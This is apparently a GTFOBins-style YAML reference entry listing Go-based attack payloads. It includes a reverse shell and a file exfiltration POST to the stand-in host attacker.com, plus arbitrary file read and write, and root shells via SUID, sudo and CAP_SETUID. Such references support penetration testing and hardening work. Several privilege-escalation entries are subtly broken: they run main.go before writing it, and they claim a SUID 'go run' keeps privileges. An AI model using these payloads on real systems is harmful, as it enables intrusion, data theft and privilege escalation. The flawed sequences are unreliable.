---
description: The payloads are compatible with Go (requires `go` compiler).
functions:
  shell:
    - code: |
        cat > main.go << 'EOF'
        package main

        import (
            "os"
            "os/exec"
        )

        func main() {
            cmd := exec.Command("/bin/sh")
            cmd.Stdin = os.Stdin
            cmd.Stdout = os.Stdout
            cmd.Stderr = os.Stderr
            cmd.Run()
        }
        EOF
        go run main.go

  reverse-shell:
    - description: Run ``nc -lvnp 12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        cat > main.go << 'EOF'
        package main

        import (
            "net"
            "os"
            "os/exec"
        )

        func main() {
            c, _ := net.Dial("tcp", os.Getenv("RHOST")+":"+os.Getenv("RPORT"))
            cmd := exec.Command("/bin/sh")
            cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
            cmd.Run()
        }
        EOF
        go run main.go

  file-upload:
    - description: Send local file via HTTP POST request.
      code: |
        export URL=http://attacker.com/upload
        export LFILE=file_to_send
        cat > main.go << 'EOF'
        package main

        import (
            "bytes"
            "net/http"
            "os"
        )

        func main() {
            data, _ := os.ReadFile(os.Getenv("LFILE"))
            http.Post(os.Getenv("URL"), "application/octet-stream", bytes.NewReader(data))
        }
        EOF
        go run main.go

  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        cat > main.go << 'EOF'
        package main

        import (
            "io"
            "net/http"
            "os"
        )

        func main() {
            r, _ := http.Get(os.Getenv("URL"))
            defer r.Body.Close()
            f, _ := os.Create(os.Getenv("LFILE"))
            defer f.Close()
            io.Copy(f, r.Body)
        }
        EOF
        go run main.go

  file-write:
    - code: |
        cat > main.go << 'EOF'
        package main

        import "os"

        func main() {
            os.WriteFile("file_to_write", []byte("DATA"), 0644)
        }
        EOF
        go run main.go

  file-read:
    - code: |
        export LFILE=file_to_read
        cat > main.go << 'EOF'
        package main

        import (
            "fmt"
            "os"
        )

        func main() {
            data, _ := os.ReadFile(os.Getenv("LFILE"))
            fmt.Print(string(data))
        }
        EOF
        go run main.go

  suid:
    - code: |
        ./go run main.go
        # with the `main.go` containing:
        # os/exec to spawn sh with -p
        cat > main.go << 'EOF'
        package main

        import (
            "os"
            "os/exec"
        )

        func main() {
            cmd := exec.Command("/bin/sh", "-p")
            cmd.Stdin = os.Stdin
            cmd.Stdout = os.Stdout
            cmd.Stderr = os.Stderr
            cmd.Run()
        }
        EOF
        ./go run main.go

  sudo:
    - code: |
        sudo go run main.go
        # with main.go containing:
        cat > main.go << 'EOF'
        package main

        import (
            "os"
            "os/exec"
        )

        func main() {
            cmd := exec.Command("/bin/sh")
            cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr
            cmd.Run()
        }
        EOF
        sudo go run main.go

  capabilities:
    - code: |
        ./go run main.go
        # binary must have CAP_SETUID set
        cat > main.go << 'EOF'
        package main

        import (
            "os"
            "os/exec"
            "syscall"
        )

        func main() {
            syscall.Setuid(0)
            cmd := exec.Command("/bin/sh")
            cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr
            cmd.Run()
        }
        EOF
        ./go run main.go
---
